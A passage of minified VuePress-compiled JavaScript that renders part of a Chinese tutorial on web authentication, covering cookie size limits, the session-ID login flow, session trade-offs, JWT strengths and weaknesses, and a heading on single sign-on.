constant"}},[t._v("CSRF")]),t._v(" 攻击\n")])])])]),t._v(" "),a("li",[t._v("cookie 有大小限制，大约为 4k")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"session"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#session"}},[this._v("#")]),this._v(" Session")])},function(){var t=this.$createElement,s=this._self._c||t;return s("pre",[s("code",[this._v("1、用户向服务器发送用户名和密码。\n2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。\n3、服务器向用户返回一个 session_id，写入用户的 Cookie。\n4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。\n5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。\n")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("因为 Session 机制状态存储在服务器，所以我们可以在服务器上控制某个 session 的失效（比如更改密码后或者无操作一段时间后失效）。")]),this._v(" "),s("li",[this._v("Session 是把用户数据放在服务器，客户端只存储 Session ID，所以在传输时相对快捷，但却又查库的压力。")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"token"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#token"}},[this._v("#")]),this._v(" Token")])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。")]),this._v(" "),s("li",[this._v("JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。")]),this._v(" "),s("li",[this._v("JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。同时要做好 xss 和 csrf 防护。最好使用 HTTPS 协议传输")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"单点登陆（sso）"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#单点登陆（sso）"}},[this._v("#")]),this._v(" 单点登陆（SSO）")])}],!1,null,null,null);s.default=n.exports}}]);